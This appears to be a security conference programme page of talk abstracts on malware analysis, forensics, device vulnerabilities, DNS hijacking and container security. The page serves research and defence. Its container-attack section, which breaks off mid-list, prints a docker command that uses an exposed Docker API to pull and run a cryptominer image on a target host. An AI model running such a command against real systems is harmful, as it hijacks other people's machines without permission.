<p>by アドリアン ヘンドリック - Hendrik Adrian - @MalwareMustDie</p>

<p>Recent development of the exploitation with file-less method is also affecting the Linux platform too. The process injection and file-less methods used for malicious code execution on some post exploitation tools for Linux are supported to perform those operations. This trend may affect many internet of services and things that can trigger a wider and multiple incidents for more damage, so we may need to re-assess again current security readiness on protecting these platform.</p>

<p>In this presentation we would like to discuss several information, methods of the file-less infection and Linux process injection in the recent  trends from the blue-teamer perspective, following by the summary on their usage the way we spotted them in some public incidents. Along with the most applicable methods that may can help to forensics such cases, to help the fellow incident response operatives on handling such cases.</p>

<p>The information shared in this presentation is set on TLP AMBER.</p>

<h2 id="tiplines-today"><a name="Tiplines+Today"></a>Tiplines Today</h2>
<p>by harlo</p>

<p>Nowadays, the majority of US-based newsrooms rely on primarily consumer-facing applications to facilitate secure communications with sources. Usage of tools like Signal, WhatsApp, Threema, and others, have spiked in usage as the most state-of-the-art way to ensure confidential conversations with at-risk leakers and whistleblowers. Documents flood newsrooms, sometimes in gigabytes at a time, and journalists need tools to interrogate that data in relative safety from device compromise, legal interception, all while getting the job at the accelerated speed of the news cycle. Let’s explore how these tools, from both a technical and behavioral usage standpoint, <em>make the news</em>. Sometimes in a good way, when a story comes out after months of clandestine collaboration with sources, and toiling over data that needs to be interrogated; sometimes in a bad way, when sources get burned, or organizations endanger themselves.</p>

<p>With this talk, I aim to explain a theoretical bridge between hackers and other technologists; and the a special group of end-users (journalists and their sources) who are, often without their prior knowledge, at the complete mercy of tools they barely understand under-the-hood. This talk should be as satisfying for hackers as it will be for folks who love to hear spicy stories about the “sausage gets made” in contemporary newsrooms.</p>

<h2 id="defeating-apt10-compiler-level-obfuscations"><a name="Defeating+APT10+Compiler-level+Obfuscations"></a>Defeating APT10 Compiler-level Obfuscations</h2>
<p>by Takahiro Haruyama</p>

<p>Compiler-level obfuscations like opaque predicates and control flow flattening are starting to be observed in the wild and will be a challenge for malware analysts and researchers. Opaque predicates and control flow flattening are obfuscation methods used to limit malware analysis by defining unused logic, performing needless calculations, and altering code flow so that it is not linear. Manual analysis of malware utilizing these obfuscations is painful and time-consuming.</p>

<p>ANEL (also referred to as UpperCut) is a RAT used by APT10, typically targeting Japan. All recent ANEL samples are obfuscated with opaque predicates and control flow flattening. In this presentation I will explain how to automatically de-obfuscate the ANEL code by modifying the existing IDA Pro plugin HexRaysDeob. Specifically the following topics will be included.</p>

<ul>
  <li>Disassembler tool internals (IDA Pro IL microcode)</li>
  <li>How to define and track opaque predicate patterns for the elimination</li>
  <li>How to break control flow flattening while considering various conditional/unconditional jump cases even if it heavily depends on the opaque predicate conditions and has multiple switch dispatchers</li>
</ul>

<p>The modified tool can work for most obfuscated functions in the tested samples. This implementation can deobfuscate approximately 92% of encountered functions. Additionally, most of the failed functions will be properly deobfuscated in IDA 7.3. Sharing the experience and knowledge of the implementation with the community will be valuable as threat actors other than APT10 may also start to use the same obfuscations.</p>

<h2 id="the-glitch-in-the-matrix"><a name="The+Glitch+In+The+Matrix"></a>The Glitch In The Matrix</h2>
<p>by Marion</p>

<p>Compared to the hordes of code reviewers and review tools that skim through pristine source code with every release cycle, the attention binary output gets from security engineers is limited. And why would security folks bother, bugs are all human-made; or, are they? Honestly, in reality, most are. Modern compilers and build setups are rather unlikely to accidentally introduce flaws into binaries, let alone security relevant flaws. Except, well, if an attacker gets her hands onto the build chain…
Now, it has been established, that compromised compilers can introduce bugs to output binaries; but really, how stealthy can this be? How small of a change can an attacker plant, and still create a security vulnerability? And which means of detection do we have for such glitches in the matrix? Shall we ask Neo?</p>

<h2 id="memory-forensics-analysis-of-cisco-ios-xr-32-bits-routers-with-amnesic-sherpa"><a name="Memory+forensics+analysis+of+Cisco+IOS+XR+32+bits+routers+with+%27Amnesic-Sherpa%27"></a>Memory forensics analysis of Cisco IOS XR 32 bits routers with ‘Amnesic-Sherpa’</h2>
<p>by Solal jacob</p>

<p>Nowadays attackers are targeting not only computers but also core network equipment like routers by using memory-only attacks that are difficult to detect as the firmware image is not modified. In order to determine if a router was compromised by a memory-only attack, we need to be able to perform forensics analysis on it, but this requires specialized tools. This presentation is about CISCO IOS XR router forensics. We will explain how work the internal of a CISCO IOS XR 32 bits, router running under the QNX operating system. And, as no tool currently exists to analyze CISCO IOS XR routers, we developed a router forensics framework called ‘Amnesic-Sherpa’, aimed at analyzing memory dump, that can be used to know if a router was compromised. This framework will be released as open-source.</p>

<p>This presentation will be divided in different parts:</p>

<p>The first part gives the necessary background: the context and the wide number of OSes in routers. We also describe the architecture of QNX, the microkernel running on IOS XR-32, and how it works: the startup
process, how the firmware is packed, the file systems in the firmware images, and the specific communication system between the processes.</p>

<p>Then, we will explain how we developed a specific memory acquisition tool and an analysis framework call ‘Amnesic-Sherpa’, aim at analyze those routers.</p>

<p>The tool first looks for all the interesting structures and information that can be present in an IOS XR memory dump, then tries to re-create the memory structures present in different parts of the microkernel memory at the moment of the dump, and extracts all available information. The tool then let the user inspects theses structures to find traces of compromise or anomalies.</p>

<p>In the last part, we verify the detection capabilities of our framework by manually modifying processes to simulate a memory attack. We then demonstrate how to use ‘Amnesic-Sherpa’ (and third party tools) to detect this attack and how the detection process could be automated.</p>

<p>by Chris Kubecka</p>

<p>Ever wonder what incident management is like when an embassy gets hacked, by ISIS? Come on a journey of surprisingly weak security, insider threats, a 50 million dollar extortion attempt, diplomatic immunity, city wide security lock down, all while &gt;400 dignitary’s lives dangle in the negotiation crossfire. Join Chris, the lead investigator and resolver on a super-secret squirrel adventure against ISIS &amp; Turkish Intel in The Hague, The Netherlands. Discussing the 2014 Saudi Arabian embassy hack. Whoever said STEM was boring made it boring! Solve the crime and save lives with key takeaways from a real life cyber terrorism investigation.  No classified information will be shared, some terrorists were harmed in the making of this talk.</p>

<p>Presentation about the following two articles and the unclassified portions of the original report I wrote for the Kingdom of Saudi Arabia, Saudi Embassy of the Netherlands and Saudi Aramco.
https://hackernoon.com/the-road-to-hell-is-paved-with-bad-passwords-ef54815873f9
https://www.csoonline.com/article/3386381/inside-the-2014-hack-of-a-saudi-embassy.html
A few years ago, I led an unusual digital crime incident investigation. A mix between cyber crime and cyber terrorism, leaving the events etched my the memory banks. Finding oneself in the midst of terrorist groups and high level political intrigue as a security expert and all around hacker seemed more fitting on a warped version of the IT crowd.
An Embassy in a European country had been hacked, pwnd hard. The back end, official business email account was targeted and subsequently misused by miscreants who sent out emails as if they were from the Ambassador’s trusted Secretary. Utilizing the compromised account, the nefarious attackers attempted to extort additional visa fees from select VVIP applicants. Time was of utmost importance. Quickly, I assembled a team, myself and one person, a senior forensics expert rockstar. We immediately travelled to the location and began the investigation.
The Embassy in question was highly distrustful of both the local police and the local Diplomatic Corp Police, a separate branch of police for embassies and diplomatic staff. The Embassy email account was high value, gave attackers access to contacts, communications and could lead to maximum damage to reputation. Non reputation concerns.
It was the Embassy IT person’s first week on the job and the previous person gave zero hand over. They couldn’t even get in touch with the previous person. The Embassy IT person had zero security experience, pure IT; but was willing to do just about anything to stop the attack. Stopping the damage, the bleeding and securing the email account was a top priority. 
“What’s the username and password?” I asked, expecting some super duper 26 + character, two factor authentication credential set, virgin blood sacrifice and the attackers were super spies. Answer: embassy@email.com, password is 123456. Yes, 123456. 
We investigated further, my forensics person checked around, taking samples, network checks via taps. Even though Windows XP was rampant, no real anti-virus was installed. They relied entirely on Microsoft Security Essentials. How good is MSE? “In June 2013, MSE achieved the lowest possible protection score, zero.” We changed the password, thought the worst was over and job done. Lucky for them, only two systems had any internet access and were on a closed network, separate from embassy government operations. Embassies frequently host intelligence services in addition to diplomacy. Glad there was a real separation, almost an air gap.</p>

<p>A few weeks later, as life was getting back to normal, another summoning. At this point, I was never going to eat my lunch. What began as some dodgy emails trying to fraudulently acquire extra visa fees using the embassy email account grew, exponentially. This time, an email went out, again from the official embassy email account, signed as the Ambassador’s Secretary to a handful of friendly embassies asking for 25 thousand Euro in the name of a friend of ISIS.
Back to the location again, this time alone to try and sort things out. Forensics was no longer required. The Ambassador was concerned it was an insider, as was I. As if we were on some sort of comedy skit on the BBC. We waited until everyone else exited the embassy after it closed for official business. Then, the comedy began by crouching down on our hands and knees looking for passwords written on post-it notes, under desks and other places. We were looking for embassy employee credentials to use their logins so I could further investigate certain employees without their knowledge. By we I mean the Ambassador and I. Never in my life had I expected to see an Ambassador sifting around dusty desks with me, on hands and knees.
We began to liaise with the Diplomatic Corps Police in a limited extent. At arms length at all times, trust was strained. It took a great deal of effort, meetings with the Ambassador to speak with any outside party.
Unfortunately, the attackers still had access somehow to the embassy email account. The Diplomatic Police, sending via CC not BCC gave away all the other official embassy back end email addresses. Then the real fun began. The attackers quickly capitalized on the faux pas and sent back an email to everyone spreading the fear. What began as a few hundred euro grew to 50 million USD.
The threats grew to not so casually mentioning a big private event the Ambassadors of the USA, UK, Japan, 400+ dignitaries and staff etc.. were slated to attend. If the money wasn’t paid up, the event would blow in more ways than one. During this time, the attackers took a particular and personal interest in the Ambassador’s Secretary, prompting the regular police to become involved for a split second. The regular police had no jurisdiction or authority in the matter and were warned to back off ASAP.
Quietly and unbeknownst to the residents. The city was put on alert, embassies locked down, every person passing by was treated with suspicion. I even had the joy of not one, but three “Cultural Attachés” of an ISIS friendly embassy try to befriend me at a pub I frequented during the investigation. One gave me a very personal gift, a set of Islamic prayer beads. Which I had promptly checked for bugs. The trio didn’t drink alcohol but would sit patiently in the pub, drinking tea for hours until I arrived. The trio said they wanted English lessons, but all spoke English.
Eventually I was able to gain the Ambassador’s trust to further interrogate some of the digital assets and accounts. This was quite unusual, I was not a citizen of the country in question. They allowed me to take back an asset to my lodgings. After getting comfortable, trying to relax, a glass of wine in hand. Eureka, I found it! The attackers still had access to the embassy email account because they had setup a back end email forwarder. Back end email forwarder closed, secured up the email account, gathered evidence. We then went on the hunt for who was behind the attack, hop by hop following each step back over multiple countries. The suspect(s) were isolated, placed under surveillance and effectively neutralized. Months later I was invited to a private embassy function. In the end, I was the only one blown away, by the Ambassador’s gift.</p>

<p>Further investigations by JM Porup, reporter for CSO Online revealed the rootkit in the original report had been used by some nefarious groups. Possibly pointing to the suspected insider having outside help.</p>

<h2 id="new-tales-of-wireless-input-devices"><a name="New+Tales+of+Wireless+Input+Devices"></a>New Tales of Wireless Input Devices</h2>
<p>by Matthias Deeg, Gerhard Klostermeier</p>

<p>In our talk, we will present new security tales and vulnerabilities of wireless mice, keyboards, and presenters using 2.4 GHz radio communication that we have collected over the last two years.</p>

<p>In 2016, we published the results of our research project “Of Mice and Keyboards: On the Security of Modern Wireless Desktop Sets” and publicly disclosed several security vulnerabilities in wireless desktop sets using AES encryption of different manufacturers. In the same year, Bastille Research independently published security vulnerabilities in wireless mice and keyboards of different manufacturers, too. As time went by, we have learned more about the (in)security of further wireless input devices like mice, keyboards, and presenters using different 2.4 GHz radio-based technologies, and want to share our experiences and gained knowledge concerning these devices.</p>

<p>In our talk, we want to present answers to unanswered questions of our previous wireless desktop set research, raise the awareness of security issues and practical attacks against vulnerable wireless input devices, and tell some interesting tales.</p>

<p>We will present different security vulnerabilities (e.g. insufficient protection of sensitive data, unencrypted communication, unauthenticated communication, keystroke injection) in different 2.4 GHz wireless input devices (e.g. keyboards, mice, wireless presenters) of different manufacturers (e.g. Microsoft, Logitech, 1byone, Fujitsu, Inateck, Targus) using different technologies (e.g. Bluetooth Classic, Bluetooth LE, Nordic Semiconductor Enhanced ShockBurst, Cypress WirelessUSB LP, other proprietary radio communication protocols), and talk about the way we found them.</p>

<p>Concerning found Bluetooth security issues, we have published the following two papers last year but did not present this research results at a conference yet:</p>

<ul>
  <li>
    <p>Case Study: Security of Modern Bluetooth Keyboards
https://www.syss.de/fileadmin/dokumente/Publikationen/2018/Security_of_Modern_Bluetooth_Keyboards.pdf</p>
  </li>
  <li>
    <p>Rikki Don’t Lose That Bluetooth Device
 https://www.syss.de/fileadmin/dokumente/Publikationen/2018/Rikki_Dont_Lose_That_Bluetooth_Device.pdf</p>
  </li>
</ul>

<p>Regarding our new research about non-bluetooth 2.4 GHz wireless input devices, our paper is still work-in-progress and will hopefully be published within the next couple of months. Different security advisories will also be published according to our responsible disclosure policy.</p>

<p>One example concerning a keystroke injection attack against the AES-encrypted wireless keyboard Fujitsu LX901 is demonstrated in the following video:</p>

<ul>
  <li>SySS Proof-of-Concept Video: Fujitsu LX901 Keystroke Injection Attack
 https://ptmd.sy.gs/videos/Fujitsu_LX901_Keystroke_Injection_Attack_PoC.mp4</li>
</ul>

<p>All in all, our talk “New Tales of Wireless Input Devices” will be quite similar to our talk “Of Mice and Keyboards: On the Security of Modern Wireless Desktop Sets” from 2016 (https://www.syss.de/fileadmin/dokumente/Publikationen/2016/2016_10_18_Of_Mice_and_Keyboards-Hack.lu_2016.pdf).</p>

<p>by Alyssa Herrera</p>

<p>I demonstrate a successful attack on a cloud-based US Defense website, gaining access to a sensitive internal network, enumeration of internal services, out of bands data leakage and attack vectors unique to cloud architecture. Additionally I will discuss mitigation points for server side request forgery, how this type of vulnerability can manifest, what this type of attack is, and how I’m able to legally hack the Department Of U.S Defense.</p>

<p>Server-side request forgery (SSRF) attacks abuse poorly secured requests made on the server-side; these requests appear in many circumstances, from getting a user’s avatar to pinging a third-party webhook. SSRF attacks hijack these HTTP requests, allowing an attacker to exploit the application to route URL/IP requests and subsequently probe or access sensitive networks.</p>

<p>Unsurprisingly, this can lead to serious breaches of security: exfiltration of secret keys, spoofing of email, and, ultimately, an entry point into an otherwise secure system. On cloud systems, SSRF gives the attacker a way to query for metadata which can reveal security credentials, or access tokens to the instance. Different cloud providers offer different safeguards; likewise they may make the threat far less clear than others do!</p>

<p>In this case study, I’ll describe how, as part of a recent U.S. Department of Defense vulnerability disclosure program, I gained access to the Non-Classified Internet Protocol Router Network (NIPRNET). We’ll look at the SSRF techniques that I used to access AWS metadata and reveal sensitive information about cloud instances. I’ll also talk about some techniques for protection against SSRF - input validation, compartmentalized services, access control, and security policies.</p>

<p>by Desiree Sacher</p>

<p>This talk is about how you can make your Security Operation Center more efficient and give your bored-out analysts more purpose, by making a small change to your security monitoring process. With a potential huge change in your workflow, and improved results.</p>

<p>The talk addresses the security monitoring resolution categories I created and documented in my taxonomy paper https://github.com/d3sre/Use_Case_Applicability. When working as an analyst in a Security Operation Center, most likely some duty will include security monitoring, depending on predefined use cases. Those use cases hopefully cover the relevant MITRE ATT&amp;CK techniques, will most likely also cover more regulatory controls like the NIST 800-53 controls, but most definitely there will be false positives more than you like. The resolution categories help in refocusing the attention of the analyst to the “actual” cause of the alert. By tracking this in a seperate taxonomy, reports and statistics can point to company internal process problems or otherwise reflect the efficiency of the SOC. This is especially important when a SOC can’t directly control all the configurations of it’s log submitting devices. 
The talk will present the categories, the idea and goal behind this suggested solution and show ways on how reports can afterwards be interpreted.</p>

<h2 id="sensor--logic-attack-surface-of-driverless-vehicles"><a name="Sensor+%26+Logic+Attack+Surface+of+Driverless+Vehicles"></a>Sensor &amp; Logic Attack Surface of Driverless Vehicles</h2>
<p>by Zoz</p>

<p>Networked and connected vehicles have the same network attack surface as other IoT devices, but are also heavily reliant on sensor inputs and the need for split second decision making under uncertain conditions, making them suffer a unique set of vulnerabilities even when network attacks are discounted. In this session the state of automated vehicle technology will be presented with a focus on the attack surface presented by vehicles’ sensor and control logic suites, and the potential failure modes that could be exploited by malicious hackers and criminals.</p>

<p>The talk will begin with an introduction to autonomous, unmanned and driverless systems, and the history thereof which most people are far from aware of.  Many people, even the technically inclined, are not familiar with the history of even driverless cars, and think it is largely a new development.  The talk will provide interesting history to correct this, then will briefly cover the current state of unmanned systems across the various domains (land/sea/air).</p>

<p>After this brief historical summary the talk will move into general failure modes, including some high profile incidents and lessons that can be learned from them.  One major case study from each of the unmanned aviation and driverless car space.</p>

<p>This is followed by a systems engineering level overview of the various subsystems that make up an autonomous system, from low level control laws to high level autonomy, what hardware and software is responsible for each, and where designers are most likely to introduce bugs.</p>

<p>After this there will be a comprehensive overview of the sensors that are used in unmanned vehicles: the type, cost, manner of working and most importantly, how they can be deliberately caused to fail.  This is backed up with real examples from the presenter’s experience and from current published research efforts.  I also intend to cover proposed “unhackable” sensor upgrades.</p>

<p>I will cover denial and spoofing attacks on:</p>
<ul>
  <li>GPS</li>
  <li>LIDAR</li>
  <li>Vision cameras/Tesla autopilot</li>
  <li>Millimeter wave radar</li>
  <li>Ultrasonic transducers</li>
  <li>Digital compass</li>
  <li>IMU</li>
  <li>Wheel encoders</li>
  <li>Ground-penetrating radar</li>
</ul>

<p>Next are attacks on the high level autonomy modules and ways to produce unexpected and undefined behaviors from the overall system.  This will give attendees a good idea of serious problems that have yet to be solved in the space.  These are NOT unserious thought experiments like the trolley problem, these are real problems that the leaders in driverless car testing are struggling with.</p>

<p>If there is time, finally, because many of these fully driverless systems may take longer to roll out than some expect, the talk will cover driver assist and safety assist modes that are already showing up in production vehicles or planned to be rolled out at the regulatory level over the next few years.  Most importantly, the US DOT specs for V2V and V2I communications that have been recently released, and placing them in the context of recent hacks on “smart infrastructure” components such as connected traffic systems.  Most likely there will not be time for this though, I have enough sensor hack info alone to fill the 45 minutes.</p>

<p>by Eyal Itkin</p>

<p>It’s a nice sunny day on your vacation, the views are stunning, and like on any other day you take out your DSLR camera and start taking pictures. Sounds magical right? But when you get back to your hotel the real shock hits you: someone infected your camera with ransomware! All your images are encrypted, and the camera is locked. How could that happen?</p>

<p>In this talk, we show a live demo of this exact scenario. Join us as we take a deep dive into the world of the Picture Transfer Protocol (PTP). The same protocol that allows you to control your camera from your phone or computer, can also enable any attacker to do that and more. We will describe in detail how we found multiple vulnerabilities in the protocol and how we exploited them remotely(!) to take over this embedded device.</p>

<p>But it doesn’t end here. While digging into our camera, we found a reliable way to take over most of the DSLR cameras without exploiting any vulnerability at all. We simply had to ask our camera to do that for us, and it worked.</p>

<p>This is the first vulnerability research on the Picture Transfer Protocol, a vendor agnostic logical layer that is common to all modern-day cameras. As DSLR cameras are used by consumers and journalists alike, this opens up the door for future research on these sensitive embedded devices.</p>

<p>by Marcus Bakker, Ruben Bouman</p>

<p>Within blue teams, it is crucial to have sufficient and adequate information on several aspects to prioritise your defence efforts. Important aspects are: visibility (indicate if you have sufficient data sources to be able to see traces of attack techniques), detection (how good are you in detecting attackers) and threat actor behaviours (to determine which attack behaviours are essential for your organisation to defend against).</p>

<p>Obtaining and administrating this information can be a challenge. In this talk we present the DeTT&amp;CT framework, build atop of MITRE ATT&amp;CK, that helps blue teams to gain insight into these aspects and to start prioritising their defence efforts. The ultimate goal of DeTT&amp;CT is to become more resilient against attacks targeting your organisation.</p>

<p>by Alexandre Bartel</p>

<p>Abstract. DOS (Disk Operating System) systems were developed in the
1970s and are still used today, for example in some embedded systems,
management applications or by the gaming community. In this article
we will study the impact of the (lack of) security of DOS applications
on modern systems. We will explain in detail the vulnerability of the
CVE-2018-20343 which affects the Build Engine - a 3D engine - and which
allows arbitrary code execution. We show that such vulnerabilities can
be found in seconds using state-of-the-art fuzzers. Often, running a DOS
applications today means running it within an emulator such as DOSBox.
Such emulators should limit the interaction between the DOS application
and the host OS. Unfortunately, we also show how DOSBox directly
allows emulated applications to access the host file system, thus allowing
to compromise the host machine by changing login scripts for instance.
While this kind of attack usually requires a user action (login, reboot, etc.)
to execute the malicious code, we further show, by explaining CVE-2019-12594, 
that even immediate arbitrary code execution can be achieved by
bypassing mitigation techniques such as DEP or ASLR. Finally, we will
describe how software vendor are (or not) patching such vulnerabilities
in DOS applications they still sell today.</p>

<p>by Saad Kadhi</p>

<p>Infosec research, good and bad, abounds, like almost everything else in this ‘infobese’ era. Cybersecurity conferences are filled with presentations exposing new vulnerabilities, as if we didn’t have enough of those already, describing best practices or showcasing tools and techniques. That is fine, as long as we keep the end goal in plain sight: protecting the digital realm.</p>

<p>In this blockchain-free talk, we’ll compare past, current and possible future trends of the threat landscape and attempt to demonstrate why, with all our goodwill and altruism, educational and mentoring programs, the sorry state of cybersecurity is here to stay unless we take a step back. It’s hard and yet necessary to question ourselves, to reframe and rephrase the messages that we keep conveying for the last twenty years, and stop the long shoulder-patting tradition. If we really care about cybersecurity, it’s time we address the core problems from a different perspective, one that requires hardship, courage and patience, one that places the audience at the centre, armed with a profit carrot in one hand and a liability stick in the other.</p>

<p>In a seminal talk titled ‘You and your research’, given at Brucon in 2011, Haroon Meer, a well known and respected security researcher, found out that there were more cybersecurity conferences than days in a year. During the same conference, Alex Hutton delivered a wonderful keynote about why information risk management Is failing and offered solutions to address this significant problem. And these are just two examples of cybersecurity folks talking to other cybersecurity folks, on and on and on, in an honest attempt to protect the digital realm, if not cure once and for all its ailments.</p>

<p>Since then, APT emerged and kept refining their craftsmanship and some run-of-the-mill cybercriminal groups reached a chilling level of proficiency. Cybersecurity conferences and training multiplied and the demand for skilled infosec professionals exploded. And the complexity of IT grew and with it the attack surface.</p>

<p>Yet, for somebody who worked long enough in this field, it feels like cleaning an ever-expanding mess, armed with a teaspoon, while a burnout is lurking in the shadows. So what our core problems besides a substantial part of an industry which keeps pushing semi-magical solutions, lured by the promises for easy money? Why it seems that we aren’t making any true progress? Is it the lack of regulations and policies? Lack of sharing? Or is it an issue of liability and an economic system that is running amok?</p>

<p>by Axelle Apvrille</p>

<p>Smartphone applications do not respect your privacy.
If you are at Hack.Lu, you probably more or less already know this.
In the best cases, you found a few solutions to minimize the issue.
Or you surrendered (what can we do about it, huh?).</p>

<p>But are you really aware of the <em>extent</em> of the problem? Is it only your IMEI and your location that leak?
Are there are still private apps out there?
Jump in for some Android disassembly, logs and Frida hooks.</p>

<p>I am a malware researcher. So, every day, I disassemble Android apps, and decide whether they are benign or malicious. We can’t expect privacy from malware, can we? But actually, nearly all so-called benign applications I look into are <em>far from private</em>.</p>

<p>It is time we discuss this seriously in a conference. I want to show you the extent of garbage-ware we find in our smartphone’s apps. Adkits are big issue, of course. There are hundreds. But there are not the only ones. There are also analytics, crash reporting, IO analyzers, affiliate SDKs, cross platform gaming frameworks…</p>

<p>Sometimes, privacy issues are blatant. Very often though, they are more insidious: e.g. reports are anonymized, but the level of details is a concern. We show issues in common genuine apps we use every day. People who use Facebook, Messenger etc usually know they face a few privacy issues. How about medical applications? games? Why do simple applications weigh 30MB for tasks they could do in less than 2? Are there still private apps out there?</p>

<p>by Itay Cohen, Ari Eitan</p>

<p>If the names Turla, Sofacy, and APT29 strike fear into your heart, you are not alone. These are known to be some of the most advanced, sophisticated and notorious APT groups out there – and not in vain. These Russian-attributed actors are part of a bigger picture in which Russia is one of the strongest powers in the cyberwarfare today. Their advanced tools, unique approaches, and solid infrastructures suggest an enormous and complicated operation that involves different military and government entities inside Russia.</p>

<p>That said, and with all the available information on these groups, there are still some questions to bear in mind: Are the different government entities working alone or are they sharing code and techniques with each other? What artifacts, libraries and code are more likely to be shared between different families and teams of the same actor?</p>

<p>The fog behind these complicated operations made us realize that while we know a lot about single actors, we are short of seeing the bigger picture - a whole ecosystem with actor interaction (or lack thereof) and particular TTPs that can be viewed in a larger scope. We decided to know more and to look at things from a broader perspective. This led us to gather, classify and analyze thousands of Russian APT malware samples in order to find connections - not only between samples, but also between different families and actors.</p>

<p>In this talk, we will describe the process of our research. Namely, we will show how the technologies at our disposal allowed us to take a deep dive into these malware’s binary DNA in order to spot the mutual Genes that are shared between Russia’s APT families and actors. We will show interesting connections that we found, and present the interactive map we created to visualize this complicated Russian APT ecosystem. We will also release a signature-based tool to detect old and new samples based on the popular mutual Genes we found.</p>

<p>by Kostiantyn Korsun</p>

<p>Since 2014 Ukraine is under cyberwar. 
Energy grid attack BlackEnergy switched off electricity for 230,000 people for 6 hours. NotPetya attack effected ~30% of Ukrainian economy. Airports, railways, banking system, media, critical infrastructure had been attacked by Russian cyber groups (Telebots, BadRabbit, GrayEnergy).
But have those attacks strengthened national cybersecurity system of Ukraine?
Ukrainian cyber activists (hacktivists) checked that and published some shocking results.
This activity got the name #FuckResponsibleDisclosure (#FRD)
My talk is a historical retrospective of #FRD: when and how it started, what emotions it caused in Ukraine, how officials and resources’ owner communicated with hacktivists and others. How #FRD influenced on national cyber security and what local Cybersec-community thinks on #FRD.
The preso contains plenty of expressive screenshots.</p>

<p>I researched #FRD as a unique activity in modern cybersecurity world.
The main goal of #FRD is to increase cybersecurity level in Ukraine. 
However Ukrainian cyber activists used controversial methods to get this goal publishing indicators of low level of cyber protection in Governmental institutions and critical infrastructure objects.
What was right/wrong in #FRD and how it influenced on national cybersecurity?
This is the matter of the research.</p>

<h2 id="dns-on-fire"><a name="DNS+On+Fire"></a>DNS On Fire</h2>
<p>by Rascagneres Paul, Warren Mercer</p>

<p>Cisco Talos identified malicious actors targeting the DNS protocol successfully for the past several years. In the presentation, we will present 2 threat actors we have been tracking.</p>

<p>The first one developed a piece of malware, named DNSpionage, targeting several government agencies in the Middle East, as well as an airline. During the research process for DNSpionage, we also discovered an effort to redirect DNSs from the targets and discovered some registered SSL certificates for them. We identified multiple countries targeted by this redirection. On 22 January 2019, the US DHS published a directive concerning this attack vector. In this presentation, we will present the timeline for these events and their technical details.</p>

<p>The second actor is behind the campaign we named “Sea Turtle”. This actor is more advanced and more aggressive than the previous one. They do not hesitate to target directly registrars and one registry. The talk will present the 2 actors and the methodology used to target the victims.</p>

<p>This talk will include:</p>
<ul>
  <li>DNS presentation because few ppl mix register, registrar, registrant</li>
  <li>the oilrig leak on the similarities between DNSpionage and the technical details in the leak.</li>
  <li>unpublished DNS hijack if the investigation is finished by the conference.</li>

<h2 id="leveraging-kvm-as-a-debugging-platform"><a name="Leveraging+KVM+as+a+debugging+platform"></a>Leveraging KVM as a debugging platform</h2>
<p>by Mathieu</p>

<p>Virtual Machine Introspection keeps opening new possibilities to interact with
Virtual Machines, from sandboxing (VMRay), to cloud monitoring solutions
(BitDefender HVI).</p>

<p>Our debuggers needs to benefit from this approach too, and so far we have seen
multiple open source projects trying to leverage the hypervisor as a new
debugging platform. However, most of these solutions are tied to one
hypervisor.</p>

<p>The VMI ecosystem can only grow if it can bring all developers under the same
roof, and provide the core libraries that will be the foundation for all VMI
applications.</p>

<p>Keeping this vision in mind, pyvmidbg is a GDB stub built on top of LibVMI, a
hypervisor-agnostic VMI library. It can introspect Windows VMs and explore the
execution context to target and debug a specific process running on the system.</p>

<p>One of the goals of pyvmidbg is to attract developers and users by writing the
missing layers that prevent VMI from gaining a wider adoption as of today.</p>

<p>The lack of VMI APIs available on KVM has made of LibVMI a Xen centric library,
despite its flexible architecture.  However, the situation recently changed in
2017, thanks to BitDefender proposing a new set of APIs for introspection.</p>

<p>This talk will demonstrate the new KVM introspection subsystem proposed by
BitDefender, its integration in LibVMI, and how pyvmidbg is running on top of
KVM today.</p>

<h2 id="who-contains-the-containers"><a name="Who+contains+the+containers"></a>Who contains the containers</h2>
<p>by Emilien, Ioana Andrada</p>

<h1 id="who-contain-the-containers-">Who contain the containers ?</h1>

<h2 id="introduction">introduction</h2>

<p>Today it is extremely easy to deploy micro-services using containers technologies. And as usual for every easy-to-deploy technologies, people have tendencies to not using common sense before using them: You are one-click away from being easily compromised !</p>

<p>In this talk we will present most common vulnerabilities and unsecure configurations found on containers technologies and how to exploit them. Then we will try to figure out if we can find actually compromised containers on Internet. Finally we will describe recommendations on how to secure and how to detect attacks against container technologies.</p>

<h2 id="attacks-against-container-technologies">Attacks against container technologies</h2>

<p>When we speak about container technologies, two main components may be subject to attacks:</p>

<ul>
  <li>Containers technologies (docker, rkt, Solaris containers, Microsoft Containers …)</li>
  <li>Container orchestration tools (kubernetes, apache meos, docker swarm, docker data center)</li>
</ul>

<p>Another important part of the environment is the storage container (clusterHQ, BlockBridge,EMC…) but it can be attacked through the orchestration engine so we will not describe them with too much details in this talk.</p>

<p>Also it is important to highlight the fact that most cloud service providers provide their own implemantation of orchestration tools, which can be targeted as well.</p>

<h3 id="exploit-vulnerabilities-to-break-out-of-containers">exploit vulnerabilities to break out of containers</h3>

<p>Worst scenario for containers is the possibility for a malicious or compromised container to escape and attack the host system. Of course it happened with a vulnerability on runC (CVE-2019-5736: runc container breakout).</p>

<p>Vulnerability was discovered by Adam Iwaniuk and Borys Popławski and affect most of the containers softwares and a proof-of-concept is available: https://github.com/Frichetten/CVE-2019-5736-PoC</p>

<p>As this vulnerability is probably the most critical, others are not to be ignored:</p>

<ul>
  <li>CVE-2018-11757 (Docker): a Docker action inheriting the Docker tag openwhisk/dockerskeleton:1.3.0 (or earlier) may allow an attacker to replace the user function inside the container if the user code is vulnerable to code exploitation,</li>
  <li>CVE-2018-8115 (Docker for Windows): A remote code execution vulnerability exists when the Windows Host Compute Service Shim (hcsshim) library fails to properly validate input while importing a container image,</li>
  <li>Vulnerabilities on “rkt enter” commands (CVE-2019-10144, CVE-2019-10145 and CVE-2019-10146): discovered by Yuval Avrahami, those vulnerabilities could be used to escape to the host system by putting traps on modified binaries in a compromised container (https://www.twistlock.com/labs-blog/breaking-out-of-coresos-rkt-3-new-cves/)</li>
</ul>

<h3 id="abusing-apis">abusing APIs</h3>

<p>APIs are great to automate admin tasks … or compromising at a scale. If not properly secured, API access can be used to start, delete or configure containers or the host sytem.</p>

<p>Here is some attack example abusing APIs:</p>

<ul>
  <li>Docker: create container via API</li>
</ul>

<p>Docker API is exposed on port 2375/TCP or 2376/TCP (SSL). If default configurtion is used (who do that ? :D) a simple POST request give us the possibility to deploy and start a Docker Image. The image will be downloaded from Docker Hub automatically…</p>

<p>We can use a crafted HTTP request or just the docker client as shown bellow:</p>

<p><code class="highlighter-rouge">docker -H target:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig -o POOOOL  -u WALLET -p X -k</code></p>

<ul>
  <li>Kubernetes: Unauthenticated endpoint on Kubelet (port 10250) to perform <code class="highlighter-rouge">exec</code> command</li>
</ul>

